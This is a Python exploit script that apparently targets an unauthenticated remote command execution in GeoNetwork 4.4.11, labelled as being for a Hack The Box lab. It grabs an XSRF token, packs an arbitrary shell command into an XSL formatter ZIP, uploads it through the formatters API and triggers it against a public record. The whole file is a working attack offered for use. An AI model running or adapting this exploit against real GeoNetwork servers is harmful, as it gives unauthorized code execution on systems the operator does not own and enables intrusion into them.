#!/usr/bin/env python3
"""Unauth GeoNetwork 4.4.11 formatter ZIP → Saxon Runtime.exec.

Lab/HTB only. Needs a public record UUID (default: Terminal 3 Expansion).
"""
from __future__ import annotations

import argparse
import io
import os
import zipfile
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HERE = Path(__file__).resolve().parent
XSL_TEMPLATE = (HERE / "formatter" / "view.xsl").read_text(encoding="utf-8")
PROPS = (HERE / "formatter" / "config.properties").read_bytes()


def session_xsrf(base: str) -> requests.Session:
    s = requests.Session()
    r = s.get(f"{base}/geonetwork/srv/eng/catalog.search", timeout=30)
    r.raise_for_status()
    tok = s.cookies.get("XSRF-TOKEN")
    if not tok:
        raise SystemExit("no XSRF-TOKEN cookie from catalog.search")
    s.headers["X-XSRF-TOKEN"] = tok
    return s


def make_zip(cmd: str) -> bytes:
    xsl = XSL_TEMPLATE.replace("CMD_PLACEHOLDER", cmd)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("view.xsl", xsl.encode("utf-8"))
        z.writestr("config.properties", PROPS)
    return buf.getvalue()


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--base", default=os.environ.get("GEO_BASE", "http://geo.airways.htb"))
    p.add_argument("--name", default=os.environ.get("FORMATTER_NAME", "labfmt"))
    p.add_argument(
        "--uuid",
        default=os.environ.get("RECORD_UUID", "b8c9d0e1-cdef-0123-4567-888888888888"),
    )
    p.add_argument("--cmd", default=os.environ.get("FORMATTER_CMD") or "")
    args = p.parse_args()
    if not args.cmd:
        raise SystemExit("set --cmd or FORMATTER_CMD")

    s = session_xsrf(args.base.rstrip("/"))
    z = make_zip(args.cmd)
    files = {"file": (f"{args.name}.zip", z, "application/zip")}
    r = s.post(
        f"{args.base.rstrip('/')}/geonetwork/srv/api/formatters",
        params={"id": args.name},
        files=files,
        timeout=30,
    )
    print(f"upload {r.status_code} {r.text[:200]}")
    if r.status_code not in (200, 201):
        raise SystemExit("formatter upload failed")

    t = s.get(
        f"{args.base.rstrip('/')}/geonetwork/srv/api/records/{args.uuid}/formatters/{args.name}",
        timeout=60,
    )
    print(f"trigger {t.status_code} {t.text[:300]}")


if __name__ == "__main__":
    main()
